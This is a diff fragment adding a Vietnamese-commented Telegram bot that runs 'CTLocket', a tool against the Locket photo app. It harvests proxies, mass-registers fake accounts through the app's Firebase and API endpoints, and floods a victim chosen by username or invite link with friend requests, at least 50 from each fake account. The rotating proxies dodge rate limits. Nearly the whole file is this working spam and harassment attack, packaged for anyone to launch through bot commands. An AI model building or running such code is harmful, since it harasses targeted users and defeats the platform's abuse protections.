+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "303",
+                },
+                "flag_15": {
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "501",
+                },
+                "flag_14": {
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "551",
+                },
+                "flag_25": {
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "23",
+                },
+            },
+            "amplitude": {
+                "device_id": "57A54C21-B633-418C-A6E3-4201E631178C",
+                "session_id": {
+                    "value": str(self.session_id),
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                },
+            },
+            "google_analytics": {"app_instance_id": "7E17CEB525FA4471BD6AA9CEC2C1BCB8"},
+            "ios_version": "1.121.1.1",
+        }
+    def excute(self, url, headers=None, payload=None, thread_id=None, step=None, proxies_dict=None):
+        # Không dùng prefix màu mè console trong bot, mà log ra file hoặc console đơn giản
+        try:
+            response=requests.post(
+                url,
+                headers=headers or self.headers_locket(),
+                json=payload,
+                proxies=proxies_dict,
+                timeout=self.request_timeout,
+                verify=False
+            )
+            response.raise_for_status()
+            self.successful_requests+=1
+            return response.json() if response.content else True
+        except ProxyError:
+            # self._print(f"[!] Proxy connection terminated") # Không print console trong bot
+            self.failed_requests+=1
+            return "proxy_dead"
+        except requests.exceptions.RequestException as e:
+            self.failed_requests+=1
+            if hasattr(e, 'response') and e.response is not None:
+                status_code=e.response.status_code
+                try:
+                    error_data=e.response.json()
+                    error_msg=error_data.get(
+                        'error', 'Remote server rejected request')
+                    # self._print(f"[!] HTTP {status_code}: {error_msg}") # Không print console trong bot
+                except:
+                    # self._print(f"[!] Server connection timeout") # Không print console trong bot
+                    pass
+                if status_code == 429:
+                    return "too_many_requests"
+            # self._print(f"[!] Network error: {str(e)[:50]}...") # Không print console trong bot
+            return None
+    def setup(self):
+        pass # Không dùng _CTLocket_panel_ trong bot, sẽ được xử lý bằng lệnh
+    def _input_(self, prompt_text="", section="config"):
+        pass # Không dùng input trong bot
+    def _CTLocket_panel_(self):
+        pass # Không dùng panel UI trong bot
+    def _extract_uid_locket(self, url: str) -> Optional[str]:
+        real_url=self._convert_url(url)
+        if not real_url:
+            self.messages.append(
+                f"Locket account not found, please try again.")
+            return None
+        parsed_url=urlparse(real_url)
+        if parsed_url.hostname != "locket.camera":
+            self.messages.append(
+                f"Locket URL không hợp lệ: {parsed_url.hostname}")
+            return None
+        if not parsed_url.path.startswith("/invites/"):
+            self.messages.append(
+                f"Link Locket Sai Định Dạng: {parsed_url.path}")
+            return None
+        parts=parsed_url.path.split("/")
+        if len(parts) > 2:
+            full_uid=parts[2]
+            uid=full_uid[:28]
+            return uid
+        self.messages.append("Không tìm thấy UID trong Link Locket")
+        return None
+    def _convert_url(self, url: str) -> str:
+        if url.startswith("https://locket.camera/invites/"):
+            return url
+        if url.startswith("https://locket.cam/"):
+            try:
+                resp=requests.get(
+                    url,
+                    headers={
+                        "User-Agent":
+                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
+                    },
+                    timeout=self.request_timeout,
+                )
+                if resp.status_code == 200:
+                    match=re.search(
+                        r'window\.location\.href\s*=\s*"([^"]+)"', resp.text)
+                    if match:
+                        parsed=urlparse(match.group(1))
+                        query=parse_qs(parsed.query)
+                        enc_link=query.get("link", [None])[0]
+                        if enc_link:
+                            return enc_link
+                        else:
+                            return None
+                    else:
+                        return None
+                else:
+                    return None
+            except Exception as e:
+                self.messages.append(
+                    f"Failed to connect to the Locket server.")
+                return ""
+        payload={"type": "toLong", "kind": "url.thanhdieu.com", "url": url}
+        headers={
+            "Accept": "*/*",
+            "Accept-Language": "vi",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "User-Agent":
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
+            "X-Requested-With": "XMLHttpRequest",
+        }
+        try:
+            response=requests.post(
+                self.SHORT_URL,
+                headers=headers,
+                data=urlencode(payload),
+                timeout=self.request_timeout,
+                verify=True,
+            )
+            response.raise_for_status()
+            _res=response.json()
+            if _res.get("status") == 1 and "url" in _res:
+                return _res["url"]
+            self.messages.append("Lỗi kết nối tới API Url.ThanhDieu.Com")
+            return ""
+        except requests.exceptions.RequestException as e:
+            self.messages.append(
+                "Lỗi kết nối tới API Url.ThanhDieu.Com " + str(e))
+            return ""
+        except ValueError:
+            self.messages.append("Lỗi kết nối tới API Url.ThanhDieu.Com")
+            return ""
+
+# Chuyển các hàm _print, _loader_, v.v. thành hàm rỗng hoặc bỏ đi nếu không cần hiển thị console
+def _print(*args, **kwargs):
+    pass
+def _loader_(message, duration=3):
+    pass
+def _sequence_(message, duration=1.5, char_set="0123456789ABCDEF"):
+    pass
+def _randchar_(duration=2):
+    pass
+def _blinking_(text, blinks=3, delay=0.1):
+    pass
+
+def _rand_str_(length=10, chars=string.ascii_lowercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(length))
+def _rand_name_():
+    return _rand_str_(8, chars=string.ascii_lowercase)
+def _rand_email_():
+    return f"{_rand_str_(15)}@thanhdieu.com"
+def _rand_pw_():
+    return 'CTLocket' + _rand_str_(4)
+def _clear_():
+    pass # Không clear console trong bot
+def typing_print(text, delay=0.02):
+    pass # Không dùng typing print trong bot
+def _matrix_():
+    pass # Không dùng matrix trong bot
+def _banner_():
+    pass # Không dùng banner trong bot
+def _stats_():
+    pass # Sẽ hiển thị stats trong tin nhắn bot
+
+def load_proxies():
+    proxies=[]
+    proxy_urls=config.PROXY_LIST
+    # config._print( # Không print console trong bot
+    #     f"{xColor.MAGENTA}{Style.BRIGHT}[*] {xColor.CYAN}Initializing proxy collection system...")
+    try:
+        with open('proxy.txt', 'r') as f:
+            file_proxies=[line.strip() for line in f if line.strip()]
+            # config._print(
+            #     f"{xColor.MAGENTA}[+] {xColor.GREEN}Found {xColor.WHITE}{len(file_proxies)} {xColor.GREEN}proxies in local storage (proxy.txt)")
+            # config._loader_("Processing local proxies", 1)
+            proxies.extend(file_proxies)
+    except FileNotFoundError:
+        # config._print(
+        #     f"{xColor.YELLOW}[!] {xColor.RED}No local proxy file detected, trying currently available proxies...")
+        pass
+    for url in proxy_urls:
+        try:
+            # config._print(
+            #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Fetching proxies from {xColor.WHITE}{url}")
+            # config._loader_(f"Connecting to {url.split('/')[2]}", 1)
+            response=requests.get(url, timeout=config.request_timeout)
+            response.raise_for_status()
+            url_proxies=[line.strip()
+                           for line in response.text.splitlines() if line.strip()]
+            proxies.extend(url_proxies)
+            # config._print(
+            #     f"{xColor.MAGENTA}[+] {xColor.GREEN}Harvested {xColor.WHITE}{len(url_proxies)} {xColor.GREEN}proxies from {url.split('/')[2]}")
+        except requests.exceptions.RequestException as e:
+            # config._print(
+            #     f"{xColor.RED}[!] {xColor.YELLOW}Connection failed: {url.split('/')[2]} - {str(e)}")
+            pass
+    proxies=list(set(proxies))
+    if not proxies:
+        # config._print(
+        #     f"{xColor.RED}[!] {xColor.YELLOW}Critical failure: No proxies available for operation")
+        return []
+    config.total_proxies=len(proxies)
+    # config._print(
+    #     f"{xColor.GREEN}[+] {xColor.CYAN}Proxy harvesting complete. {xColor.WHITE}{len(proxies)} {xColor.CYAN}unique proxies loaded")
+    return proxies
+def init_proxy():
+    proxies=load_proxies()
+    if not proxies:
+        # config._print(
+        #     f"{xColor.RED}[!] {xColor.YELLOW}Operation aborted: No proxies available")
+        # config._loader_("Shutting down system", 1)
+        return None, 0 # Trả về None nếu không có proxy
+    # config._print(
+    #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Randomizing proxy sequence for optimal distribution")
+    random.shuffle(proxies)
+    # config._loader_("Optimizing proxy rotation algorithm", 1)
+    proxy_queue=Queue()
+    for proxy in proxies:
+        proxy_queue.put(proxy)
+    num_threads=len(proxies)
+    # config._print(
+    #     f"{xColor.GREEN}[+] {xColor.CYAN}Proxy system initialized with {xColor.WHITE}{num_threads} {xColor.CYAN}endpoints")
+    return proxy_queue, num_threads
+def format_proxy(proxy_str):
+    if not proxy_str:
+        return None
+    try:
+        if not proxy_str.startswith(('http://', 'https://')):
+            proxy_str=f"http://{proxy_str}"
+        return {"http": proxy_str, "https": proxy_str}
+    except Exception as e:
+        # config._print(
+        #     f"{xColor.RED}[!] {xColor.YELLOW}Proxy format error: {e}")
+        return None
+def get_proxy(proxy_queue, thread_id, stop_event=None):
+    try:
+        if stop_event is not None and stop_event.is_set():
+            return None
+        proxy_str=proxy_queue.get_nowait()
+        return proxy_str
+    except queue.Empty:
+        if stop_event is None or not stop_event.is_set():
+            # config._print(
+            #     f"{xColor.RED}[Thread-{thread_id:03d}] {xColor.YELLOW}Proxy pool exhausted")
+            pass
+        return None
+def excute(url, headers=None, payload=None, thread_id=None, step=None, proxies_dict=None):
+    return config.excute(url, headers, payload, thread_id, step, proxies_dict)
+def step1b_sign_in(email, password, thread_id, proxies_dict):
+    if not email or not password:
+        # config._print(
+        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.RED}[✗] Authentication failed: Invalid credentials")
+        return None
+    payload={
+        "email": email,
+        "password": password,
+        "clientType": "CLIENT_TYPE_IOS",
+        "returnSecureToken": True
+    }
+    vtd=excute(
+        f"{config.FIREBASE_AUTH_URL}/verifyPassword?key={config.FIREBASE_API_KEY}",
+        headers=config.firebase_headers_locket(),
+        payload=payload,
+        thread_id=thread_id,
+        step="Auth",
+        proxies_dict=proxies_dict
+    )
+    if vtd and 'idToken' in vtd:
+        # config._print(
+        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.GREEN}[✓] Authentication successful")
+        return vtd.get('idToken')
+    # config._print(
+    #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Auth{Style.RESET_ALL}] {xColor.RED}[✗] Authentication failed")
+    return None
+def step2_finalize_user(id_token, thread_id, proxies_dict):
+    if not id_token:
+        # config._print(
+        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.RED}[✗] Profile creation failed: Invalid token")
+        return False
+    first_name=config.NAME_TOOL
+    last_name=' '.join(random.sample([
+        '😀', '😂', '😍', '🥰', '😊', '😇', '😚', '😘', '😻', '😽', '🤗',
+        '😎', '🥳', '😜', '🤩', '😢', '😡', '😴', '🙈', '🙌', '💖', '🔥', '👍',
+        '✨', '🌟', '🍎', '🍕', '🚀', '🎉', '🎈', '🌈', '🐶', '🐱', '🦁',
+        '😋', '😬', '😳', '😷', '🤓', '😈', '👻', '💪', '👏', '🙏', '💕', '💔',
+        '🌹', '🍒', '🍉', '🍔', '🍟', '☕', '🍷', '🎂', '🎁', '🎄', '🎃', '🔔',
+        '⚡', '💡', '📚', '✈️', '🚗', '🏠', '⛰️', '🌊', '☀️', '☁️', '❄️', '🌙',
+        '🐻', '🐼', '🐸', '🐝', '🦄', '🐙', '🦋', '🌸', '🌺', '🌴', '🏀', '⚽', '🎸'
+    ], 5)) if config.USE_EMOJI else '' # Dựa vào USE_EMOJI để quyết định có thêm emoji không
+    username=_rand_name_()
+    payload={
+        "data": {
+            "username": username,
+            "last_name": last_name,
+            "require_username": True,
+            "first_name": first_name
+        }
+    }
+    headers=config.headers_locket()
+    headers['Authorization']=f"Bearer {id_token}"
+    result=excute(
+        f"{config.API_BASE_URL}/finalizeTemporaryUser",
+        headers=headers,
+        payload=payload,
+        thread_id=thread_id,
+        step="Profile",
+        proxies_dict=proxies_dict
+    )
+    if result:
+        # config._print(
+        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.GREEN}[✓] Profile created: {xColor.YELLOW}{username}")
+        return True
+    # config._print(
+    #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Profile{Style.RESET_ALL}] {xColor.RED}[✗] Profile creation failed")
+    return False
+def step3_send_friend_request(id_token, thread_id, proxies_dict):
+    if not id_token:
+        # config._print(
+        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.RED}[✗] Connection failed: Invalid token")
+        return False
+    payload={
+        "data": {
+            "user_uid": config.TARGET_FRIEND_UID,
+            "source": "signUp",
+            "platform": "iOS",
+            "messenger": "Messages",
+            "invite_variant": {"value": "1002", "@type": "type.googleapis.com/google.protobuf.Int64Value"},
+            "share_history_eligible": True,
+            "rollcall": False,
+            "prompted_reengagement": False,
+            "create_ofr_for_temp_users": False,
+            "get_reengagement_status": False
+        }
+    }
+    headers=config.headers_locket()
+    headers['Authorization']=f"Bearer {id_token}"
+    result=excute(
+        f"{config.API_BASE_URL}/sendFriendRequest",
+        headers=headers,
+        payload=payload,
+        thread_id=thread_id,
+        step="Friend",
+        proxies_dict=proxies_dict
+    )
+    if result:
+        # config._print(
+        #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.GREEN}[✓] Connection established with target")
+        return True
+    # config._print(
+    #     f"[{xColor.CYAN}Thread-{thread_id:03d}{Style.RESET_ALL} | {xColor.MAGENTA}Friend{Style.RESET_ALL}] {xColor.RED}[✗] Connection failed")
+    return False
+def _cd_(message, count=5, delay=0.2):
+    pass # Không dùng countdown trong bot
+
+# === Hết phần dán code ===
+
+# Cấu hình bot Telegram
+BOT_TOKEN = "YOUR_BOT_TOKEN_HERE" # Thay YOUR_BOT_TOKEN_HERE bằng token của bot bạn
+bot = telebot.TeleBot(BOT_TOKEN)
+
+# Khởi tạo config toàn cục
+config = CTLocket()
+
+# Dictionary để lưu trạng thái của từng người dùng
+user_states = {} # user_id: {"command": "locket", "target": None, "username_custom": None, "use_emoji": True, "message_id": None}
+last_command_time = {} # user_id: last_timestamp
+
+# Proxy management for bot
+bot_proxy_queue = Queue()
+bot_num_threads = 0
+proxy_reload_time = 5 * 60 # 5 phút
+last_proxy_reload = time.time()
+stop_proxy_reload_event = threading.Event()
+
+def reload_proxies_periodically():
+    global bot_proxy_queue, bot_num_threads, last_proxy_reload
+    while not stop_proxy_reload_event.is_set():
+        if time.time() - last_proxy_reload >= proxy_reload_time:
+            bot_proxy_queue, bot_num_threads = init_proxy()
+            if bot_num_threads == 0:
+                print("Warning: No proxies loaded after reload.")
+            last_proxy_reload = time.time()
+            print(f"Proxies reloaded at {datetime.datetime.now()}")
+        time.sleep(60) # Kiểm tra mỗi 1 phút
+
+# Bắt đầu luồng tải lại proxy định kỳ
+proxy_reload_thread = threading.Thread(target=reload_proxies_periodically)
+proxy_reload_thread.daemon = True
+proxy_reload_thread.start()
+
+# Hàm để lấy proxy từ queue và tự động reload nếu hết
+def get_bot_proxy():
+    global bot_proxy_queue, bot_num_threads
+    try:
+        proxy_str = bot_proxy_queue.get_nowait()
+        bot_proxy_queue.put(proxy_str) # Add back to end of queue for continuous rotation
+        return format_proxy(proxy_str)
+    except queue.Empty:
+        # Nếu hết proxy, cố gắng reload ngay lập tức (ngoài luồng định kỳ)
+        bot_proxy_queue, bot_num_threads = init_proxy()
+        if bot_num_num_threads == 0:
+            return None # Thật sự không có proxy nào
+        return get_bot_proxy() # Thử lại sau khi reload
+
+def run_locket_attack(chat_id, user_id, message_id, target_uid, username_custom, use_emoji):
+    try:
+        config.TARGET_FRIEND_UID = target_uid
+        config.NAME_TOOL = username_custom
+        config.USE_EMOJI = use_emoji
+        
+        # Khởi tạo lại biến đếm request cho mỗi lần tấn công
+        config.successful_requests = 0
+        config.failed_requests = 0
+
+        # Số vòng lặp mong muốn (2-3 vòng cho VIP)
+        num_loops = random.randint(2, 3) 
+        
+        total_accounts_created = 0
+        
+        for loop in range(num_loops):
+            bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
+                                  text=f"⏳️ Đang chạy vòng {loop+1}/{num_loops}...\n"
+                                       f"Tổng số yêu cầu thành công: <b>{config.successful_requests}</b>\n"
+                                       f"Tổng số yêu cầu thất bại: <b>{config.failed_requests}</b>",
+                                  parse_mode='HTML')
+            
+            threads = []
+            stop_event = threading.Event() # Event để dừng các luồng
+            
+            current_loop_successful = 0
+            current_loop_failed = 0
+
+            proxy_queue_for_loop, num_threads_for_loop = init_proxy()
+            if num_threads_for_loop == 0:
+                bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
+                                      text="❌ Không có proxy khả dụng để chạy tấn công.",
+                                      parse_mode='HTML')
+                break # Thoát khỏi vòng lặp nếu không có proxy
+
+            for i in range(num_threads_for_loop):
+                thread = threading.Thread(target=worker_locket_attack, 
+                                          args=(i, proxy_queue_for_loop, stop_event, chat_id, message_id))
+                threads.append(thread)
+                thread.daemon = True
+                thread.start()
+            
+            # Chờ các luồng hoàn thành trong một khoảng thời gian nhất định
+            # Hoặc có thể đặt một ngưỡng số lượng account thành công
+            max_wait_time_per_loop = 120 # 2 phút mỗi vòng lặp
+            start_loop_time = time.time()
+            
+            while threading.active_count() > 3 and (time.time() - start_loop_time < max_wait_time_per_loop) and not stop_event.is_set():
+                time.sleep(5) # Kiểm tra mỗi 5 giây
+                
+                # Cập nhật số liệu thành công/thất bại và gửi tin nhắn
+                bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
+                                      text=f"⏳️ Đang chạy vòng {loop+1}/{num_loops}...\n"
+                                           f"Tổng số yêu cầu thành công: <b>{config.successful_requests}</b>\n"
+                                           f"Tổng số yêu cầu thất bại: <b>{config.failed_requests}</b>",
+                                      parse_mode='HTML')
+
+            stop_event.set() # Dừng tất cả các luồng sau khi hết thời gian hoặc đạt mục tiêu
+            for t in threads:
+                t.join(timeout=1) # Chờ các luồng kết thúc gracefully
+            
+            current_loop_successful = config.successful_requests - total_accounts_created # accounts tạo thành công trong vòng này
+            total_accounts_created = config.successful_requests
+
+            if current_loop_successful == 0 and loop > 0: # Nếu không tạo được tài khoản nào trong vòng này và không phải vòng đầu tiên
+                bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
+                                      text=f"❌ Vòng {loop+1}/{num_loops} thất bại, dừng tấn công.\n"
+                                           f"Tổng số yêu cầu thành công: <b>{config.successful_requests}</b>\n"
+                                           f"Tổng số yêu cầu thất bại: <b>{config.failed_requests}</b>",
+                                      parse_mode='HTML')
+                break # Thoát khỏi vòng lặp nếu không thành công
+        
+        final_message = (f"✅ Attack đã hoàn thành!\n"
+                         f"Username của chiến dịch: <code>{username_custom}</code>\n"
+                         f"Target UID: <code>{target_uid}</code>\n"
+                         f"Tổng số yêu cầu thành công: <b>{config.successful_requests}</b>\n"
+                         f"Tổng số yêu cầu thất bại: <b>{config.failed_requests}</b>")
+        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_message, parse_mode='HTML')
+        
+    except Exception as e:
+        bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
+                              text=f"❌ Đã có lỗi xảy ra trong quá trình tấn công: {e}", parse_mode='HTML')
+
+def worker_locket_attack(thread_id, proxy_queue, stop_event, chat_id, message_id):
+    # Hàm này tương tự step1_create_account nhưng đã được điều chỉnh cho bot
+    # Bỏ các phần print ra console và thay bằng logic để xử lý qua bot
+    while not stop_event.is_set():
+        current_proxy = get_proxy(proxy_queue, thread_id, stop_event)
+        proxies_dict = format_proxy(current_proxy)
+        proxy_usage_count = 0
+        failed_attempts = 0
+        max_failed_attempts = 3 # Giảm số lần thử lại trên cùng một proxy để nhanh chuyển proxy khác
+
+        if not current_proxy:
+            # Nếu không có proxy, có thể chờ hoặc thoát luồng nếu stop_event được set
+            time.sleep(1) 
+            continue # Thử lại proxy khác
+        
+        while not stop_event.is_set() and proxy_usage_count < config.ACCOUNTS_PER_PROXY and failed_attempts < max_failed_attempts:
+            if stop_event.is_set():
+                return
+            if not current_proxy: # Nếu proxy bị đánh dấu là "chết" hoặc "hết giới hạn"
+                current_proxy = get_proxy(proxy_queue, thread_id, stop_event)
+                proxies_dict = format_proxy(current_proxy)
+                if not current_proxy:
+                    # bot.send_message(chat_id, f"Thread {thread_id}: Không có proxy khả dụng, chờ...")
+                    time.sleep(1)
+                    break # Thoát khỏi vòng lặp hiện tại, để luồng chờ proxy mới
+            
+            email = _rand_email_()
+            password = _rand_pw_()
+
+            payload = {
+                "data": {
+                    "email": email,
+                    "password": password,
+                    "client_email_verif": True,
+                    "client_token": _rand_str_(40, chars=string.hexdigits.lower()),
+                    "platform": "ios"
+                }
+            }
+            if stop_event.is_set():
+                return
+            response_data = excute(
+                f"{config.API_BASE_URL}/createAccountWithEmailPassword",
+                headers=config.headers_locket(),
+                payload=payload,
+                thread_id=thread_id,
+                step="Register",
+                proxies_dict=proxies_dict
+            )
+
+            if stop_event.is_set():
+                return
+            if response_data == "proxy_dead" or response_data == "too_many_requests":
+                failed_attempts += 1
+                current_proxy = None # Đánh dấu proxy này là không dùng được nữa cho lần sau
+                continue
+
+            if isinstance(response_data, dict) and response_data.get('result', {}).get('status') == 200:
+                proxy_usage_count += 1
+                failed_attempts = 0 # Reset số lần thất bại nếu thành công
+                if stop_event.is_set():
+                    return
+                id_token = step1b_sign_in(email, password, thread_id, proxies_dict)
+                if stop_event.is_set():
+                    return
+                if id_token:
+                    if step2_finalize_user(id_token, thread_id, proxies_dict):
+                        if stop_event.is_set():
+                            return
+                        first_request_success = step3_send_friend_request(id_token, thread_id, proxies_dict)
+                        if first_request_success:
+                            # Tăng 50 request cho VIP
+                            for _ in range(50):
+                                if stop_event.is_set():
+                                    return
+                                step3_send_friend_request(id_token, thread_id, proxies_dict)
+                    else:
+                        pass # Profile creation failed, not critical for spam
+                else:
+                    pass # Auth failed, not critical for spam
+            else:
+                failed_attempts += 1 # Tăng số lần thất bại nếu tạo account thất bại
+        
+        # Nếu đã dùng hết quota trên proxy hoặc proxy bị chết, thoát vòng lặp để lấy proxy mới
+        # Nếu failed_attempts đạt ngưỡng, thread này sẽ tự động lấy proxy mới ở vòng lặp ngoài.
+
+
+@bot.message_handler(commands=['locket'])
+def handle_locket_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    
+    # Check cooldown
+    if user_id in last_command_time:
+        time_since_last_command = time.time() - last_command_time[user_id]
+        if time_since_last_command < 300: # 5 phút = 300 giây
+            remaining_time = int(300 - time_since_last_command)
+            bot.reply_to(message, f"Bạn cần chờ {remaining_time // 60} phút {remaining_time % 60} giây trước khi sử dụng lại lệnh này.", parse_mode='HTML')
+            return
+
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        bot.reply_to(message, "Vui lòng cung cấp Username hoặc Link Locket. Ví dụ: `/locket username_hoac_link`", parse_mode='HTML')
+        return
+
+    target_input = args[1].strip()
+
+    # Reset trạng thái người dùng
+    user_states[user_id] = {
+        "command": "locket",
+        "target": None,
+        "username_custom": "CTLocket Tool Pro", # Default
+        "use_emoji": True, # Default
+        "message_id": None
+    }
+
+    sent_message = bot.reply_to(message, "⏳️ Đang kiểm tra Username hoặc Link Locket...", parse_mode='HTML')
+    user_states[user_id]["message_id"] = sent_message.message_id
+    
+    # Kiểm tra và lấy UID trong một luồng riêng để tránh block bot
+    threading.Thread(target=check_and_set_target, args=(chat_id, user_id, sent_message.message_id, target_input)).start()
+
+def check_and_set_target(chat_id, user_id, message_id, target_input):
+    global config # Sử dụng config toàn cục
+
+    if not target_input.startswith(("http://", "https://")) and not target_input.startswith("locket."):
+        url_to_check = f"https://locket.cam/{target_input}"
+    else:
+        url_to_check = target_input
+
+    if url_to_check.startswith("locket."):
+        url_to_check = f"https://{url_to_check}"
+
+    config.messages = [] # Xóa thông báo lỗi cũ
+    uid = config._extract_uid_locket(url_to_check)
+
+    if uid:
+        user_states[user_id]["target"] = uid
+        keyboard = InlineKeyboardMarkup()
+        keyboard.row(
+            InlineKeyboardButton("Bật Emoji", callback_data=f"emoji_on_{user_id}"),
+            InlineKeyboardButton("Tắt Emoji", callback_data=f"emoji_off_{user_id}")
+        )
+        keyboard.add(InlineKeyboardButton("Xác nhận chạy Attack", callback_data=f"confirm_attack_{user_id}"))
+
+        bot.edit_message_text(chat_id=chat_id, message_id=message_id,
+                              text=f"✅ Tìm thấy Locket UID: <code>{uid}</code>\n"
+                                   f"Username mặc định: <b>CTLocket Tool Pro</b>\n"
+                                   f"Emoji hiện đang: <b>BẬT</b>\n\n"
+                                   f"Bạn muốn tùy chỉnh gì không?",
+                              reply_markup=keyboard, parse_mode='HTML')
+    else:
+        error_message = "❌ Không tìm thấy Locket UID hoặc link không hợp lệ.\n"
+        if config.messages:
+            error_message += "\n".join([f"• {msg}" for msg in config.messages])
+        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=error_message, parse_mode='HTML')
+        if user_id in user_states:
+            del user_states[user_id] # Xóa trạng thái nếu không tìm thấy UID
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('emoji_'))
+def handle_emoji_callback(call):
+    user_id = call.from_user.id
+    chat_id = call.message.chat.id
+    message_id = call.message.message_id
+
+    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
+        bot.answer_callback_query(call.id, "Phiên làm việc này đã hết hạn hoặc không hợp lệ.")
+        return
+
+    action = call.data.split('_')[1] # 'on' or 'off'
+
+    if action == 'on':
+        user_states[user_id]["use_emoji"] = True
+    elif action == 'off':
+        user_states[user_id]["use_emoji"] = False
+    
+    uid = user_states[user_id]["target"]
+    username_custom = user_states[user_id]["username_custom"]
+    emoji_status = "BẬT" if user_states[user_id]["use_emoji"] else "TẮT"
+
+    keyboard = InlineKeyboardMarkup()
+    keyboard.row(
+        InlineKeyboardButton("Bật Emoji", callback_data=f"emoji_on_{user_id}"),
+        InlineKeyboardButton("Tắt Emoji", callback_data=f"emoji_off_{user_id}")
+    )
+    keyboard.add(InlineKeyboardButton("Xác nhận chạy Attack", callback_data=f"confirm_attack_{user_id}"))
+
+    bot.edit_message_text(chat_id=chat_id, message_id=message_id,
+                          text=f"✅ Tìm thấy Locket UID: <code>{uid}</code>\n"
+                               f"Username mặc định: <b>{username_custom}</b>\n"
+                               f"Emoji hiện đang: <b>{emoji_status}</b>\n\n"
+                               f"Bạn muốn tùy chỉnh gì không?",
+                          reply_markup=keyboard, parse_mode='HTML')
+    bot.answer_callback_query(call.id, f"Đã {emoji_status} Emoji.")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_attack_'))
+def handle_confirm_attack_callback(call):
+    user_id = call.from_user.id
+    chat_id = call.message.chat.id
+    message_id = call.message.message_id
+
+    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
+        bot.answer_callback_query(call.id, "Phiên làm việc này đã hết hạn hoặc không hợp lệ.")
+        return
+
+    target_uid = user_states[user_id]["target"]
+    username_custom = user_states[user_id]["username_custom"]
+    use_emoji = user_states[user_id]["use_emoji"]
+    
+    if not target_uid:
+        bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
+                              text="❌ Lỗi: Không tìm thấy Target UID. Vui lòng thử lại lệnh /locket.", parse_mode='HTML')
+        bot.answer_callback_query(call.id, "Lỗi Target UID.")
+        if user_id in user_states:
+            del user_states[user_id]
+        return
+
+    keyboard = InlineKeyboardMarkup()
+    keyboard.row(
+        InlineKeyboardButton("Đúng, xác nhận Attack", callback_data=f"start_attack_{user_id}"),
+        InlineKeyboardButton("Không, hủy bỏ", callback_data=f"cancel_attack_{user_id}")
+    )
+    
+    bot.edit_message_text(chat_id=chat_id, message_id=message_id,
+                          text=f"Bạn có chắc chắn muốn bắt đầu tấn công Locket với các thông tin sau không?\n\n"
+                               f"Target UID: <code>{target_uid}</code>\n"
+                               f"Username tùy chỉnh: <b>{username_custom}</b>\n"
+                               f"Sử dụng Emoji: <b>{'CÓ' if use_emoji else 'KHÔNG'}</b>",
+                          reply_markup=keyboard, parse_mode='HTML')
+    bot.answer_callback_query(call.id, "Xác nhận Attack?")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('start_attack_'))
+def handle_start_attack_callback(call):
+    user_id = call.from_user.id
+    chat_id = call.message.chat.id
+    message_id = call.message.message_id
+
+    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
+        bot.answer_callback_query(call.id, "Phiên làm việc này đã hết hạn hoặc không hợp lệ.")
+        return
+
+    target_uid = user_states[user_id]["target"]
+    username_custom = user_states[user_id]["username_custom"]
+    use_emoji = user_states[user_id]["use_emoji"]
+
+    if not target_uid:
+        bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
+                              text="❌ Lỗi: Không tìm thấy Target UID. Vui lòng thử lại lệnh /locket.", parse_mode='HTML')
+        bot.answer_callback_query(call.id, "Lỗi Target UID.")
+        if user_id in user_states:
+            del user_states[user_id]
+        return
+
+    # Set cooldown for this user
+    last_command_time[user_id] = time.time()
+
+    # Bắt đầu luồng tấn công chính
+    bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
+                          text="⏳️ Đang khởi tạo Attack, vui lòng chờ...", parse_mode='HTML')
+    threading.Thread(target=run_locket_attack, args=(chat_id, user_id, message_id, target_uid, username_custom, use_emoji)).start()
+    bot.answer_callback_query(call.id, "Bắt đầu Attack!")
+    
+    # Xóa trạng thái sau khi bắt đầu tấn công (để tránh lỗi khi người dùng ấn lại các nút cũ)
+    if user_id in user_states:
+        del user_states[user_id]
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('cancel_attack_'))
